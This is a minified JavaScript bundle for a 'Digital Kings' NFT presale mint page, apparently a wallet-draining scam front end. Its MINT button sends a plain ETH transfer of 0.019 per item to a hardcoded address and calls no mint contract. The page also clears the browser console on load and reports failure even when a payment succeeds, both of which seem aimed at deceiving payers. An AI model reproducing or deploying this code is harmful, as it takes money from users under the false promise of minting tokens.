(this.webpackJsonpdonation_v2=this.webpackJsonpdonation_v2||[]).push([[0],{209:function(e,t,n){},239:function(e,t){},242:function(e,t){},245:function(e,t){},249:function(e,t){},276:function(e,t){},278:function(e,t){},292:function(e,t){},294:function(e,t){},323:function(e,t){},325:function(e,t){},415:function(e,t){},416:function(e,t){},510:function(e,t,n){"use strict";n.r(t);var c=n(21),s=n.n(c),a=n(200),r=n.n(a),i=(n(209),n(60)),o=n(6),l=n(7),d=n(11),u=n(10),h=n(16),j=n.n(h),b=(n(211),n(212),n(201)),x=n(5),m=n(225),p="0x38636411b00fc9b611Eab6a0cF869a4EAbA686BD",f=function(e){Object(d.a)(n,e);var t=Object(u.a)(n);function n(){var e;Object(o.a)(this,n);for(var c=arguments.length,s=new Array(c),a=0;a<c;a++)s[a]=arguments[a];return(e=t.call.apply(t,[this].concat(s))).state={errorMessage:"",connected:!1,sending:!1,pandaCount:1},e.incrementMintAmount=function(){var t=e.state.pandaCount+1;t>5&&(t=5),e.setState({pandaCount:t})},e}return Object(l.a)(n,[{key:"componentDidMount",value:function(){var e=Object(i.a)(j.a.mark((function e(){var t;return j.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return setTimeout((function(){console.clear()}),100),e.next=3,this.ethEnabled();case 3:t=e.sent,this.setState({connected:t});case 5:case"end":return e.stop()}}),e,this)})));return function(){return e.apply(this,arguments)}}()},{key:"ethEnabled",value:function(){var e=Object(i.a)(j.a.mark((function e(){return j.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if(!window.ethereum){e.next=5;break}return e.next=3,window.ethereum.send("eth_requestAccounts");case 3:return window.web3=new m(window.ethereum),e.abrupt("return",!0);case 5:return e.abrupt("return",!1);case 6:case"end":return e.stop()}}),e)})));return function(){return e.apply(this,arguments)}}()},{key:"didSelectWallet",value:function(){var e=Object(i.a)(j.a.mark((function e(){return j.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:try{console.log(this.ethEnabled())}catch(t){console.log("error",t)}case 1:case"end":return e.stop()}}),e,this)})));return function(){return e.apply(this,arguments)}}()},{key:"didSelecteDonate",value:function(){var e=Object(i.a)(j.a.mark((function e(){var t,n,c,s,a,r,i;return j.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,e.next=3,this.ethEnabled();case 3:if(t=e.sent,!b.isMobile||t){e.next=8;break}window.location.assign("https://metamask.app.link/dapp/digitalkings.xyz/"),e.next=20;break;case 8:return n=this.state.pandaCount,c=window.web3,s=c.currentProvider.selectedAddress,a=(a=.019*n).toString(),r=c.utils.toWei(a,"ether"),this.setState({sending:!0}),e.next=17,c.eth.sendTransaction({from:s,to:p,value:r});case 17:i=e.sent,this.setState({sending:!1}),i.status?this.setState({errorMessage:"Something went wrong. Please try again."}):this.setState({errorMessage:"Transaction not successfull."});case 20:e.next=27;break;case 22:e.prev=22,e.t0=e.catch(0),console.log("error",e.t0),this.setState({sending:!1,errorMessage:"Transaction not successfull."}),e.t0.code&&this.setState({errorMessage:e.t0.message});case 27:case"end":return e.stop()}}),e,this,[[0,22]])})));return function(){return e.apply(this,arguments)}}()},{key:"decrementMintAmount",value:function(){var e=this.state.pandaCount-1;e<1&&(e=1),this.setState({pandaCount:e})}},{key:"render",value:function(){var e=this,t=this.state,n=(t.errorMessage,t.connected,t.sending,t.pandaCount);return Object(x.jsx)("div",{class:"container",children:Object(x.jsx)("div",{class:"card",children:Object(x.jsxs)("div",{class:"container-fliud",children:[Object(x.jsx)("div",{className:"text-center",children:Object(x.jsx)("img",{src:"./config/logo.png",height:"60",style:{marginBottom:30}})}),Object(x.jsxs)("div",{class:"wrapper row",children:[Object(x.jsx)("div",{class:"preview col-md-6",children:Object(x.jsx)("div",{children:Object(x.jsx)("img",{src:"./config/pic.png"})})}),Object(x.jsxs)("div",{class:"details col-md-6",children:[Object(x.jsx)("div",{className:"text-center",children:Object(x.jsxs)("h1",{class:"plainFaceFont",children:["PRESALE IS ",Object(x.jsx)("span",{class:"sub",children:"LIVE"}),"! "]})}),Object(x.jsx)("div",{className:"text-center",children:Object(x.jsx)("h1",{className:"rab",children:"Digital Kings is a collection of 2555 Kings on the polygon network with Ethereum contract functionality with a play-to-earn crypto game."})}),Object(x.jsx)("div",{className:"text-center",children:Object(x.jsxs)("h1",{class:"plainFaceFont",children:["DIGITAL KINGS NFT PUBLIC MINT DATE",Object(x.jsx)("span",{class:"sub",children:" FEBRUARY 26"})]})}),Object(x.jsxs)("div",{className:"row border",children:[Object(x.jsx)("div",{className:"col-md-6 col-xs-6",children:Object(x.jsx)("img",{src:"./s.gif",className:"gif"})}),Object(x.jsxs)("div",{className:"col-md-6 text-right max col-xs-6",children:[Object(x.jsx)("p",{children:Object(x.jsx)("b",{children:"Price:"})}),Object(x.jsx)("p",{className:"max-value",children:"0.019 ETH each"})]})]}),Object(x.jsxs)("div",{className:"row border bg",children:[Object(x.jsxs)("div",{className:"col-md-6 button col-xs-6",children:[Object(x.jsx)("button",{onClick:function(t){t.preventDefault(),e.decrementMintAmount()},className:"inc_btn",children:"-"}),Object(x.jsx)("p",{className:"value",children:n}),Object(x.jsx)("button",{onClick:function(t){t.preventDefault(),e.incrementMintAmount()},className:"inc_btn",children:"+"})]}),Object(x.jsx)("div",{className:"col-md-6 text-right btn-mx col-xs-6",children:Object(x.jsx)("button",{onClick:function(t){t.preventDefault(),e.setState({pandaCount:5})},className:"max-button",children:"SET MAX"})})]}),Object(x.jsx)("div",{className:"hr"}),Object(x.jsxs)("div",{className:"row padding",children:[Object(x.jsx)("div",{className:"col-md-6  col-xs-6",children:Object(x.jsx)("p",{children:"Total"})}),Object(x.jsx)("div",{className:"col-md-6 text-right col-xs-6",children:Object(x.jsx)("p",{children:Object(x.jsxs)("b",{children:[.019*n," ETH"]})})})]}),Object(x.jsx)("div",{className:"hr"}),Object(x.jsxs)("div",{className:"text-center",children:[Object(x.jsx)("button",{onClick:function(t){t.preventDefault(),e.didSelecteDonate()},className:"max-button donate mt",children:"MINT"}),Object(x.jsx)("br",{}),Object(x.jsx)("br",{})]})]})]})]})})})}}]),n}(c.Component),v=function(e){e&&e instanceof Function&&n.e(3).then(n.bind(null,513)).then((function(t){var n=t.getCLS,c=t.getFID,s=t.getFCP,a=t.getLCP,r=t.getTTFB;n(e),c(e),s(e),a(e),r(e)}))};r.a.render(Object(x.jsx)(s.a.StrictMode,{children:Object(x.jsx)(f,{})}),document.getElementById("root")),v()}},[[510,1,2]]]);
//# sourceMappingURL=main.c64c793e.chunk.js.map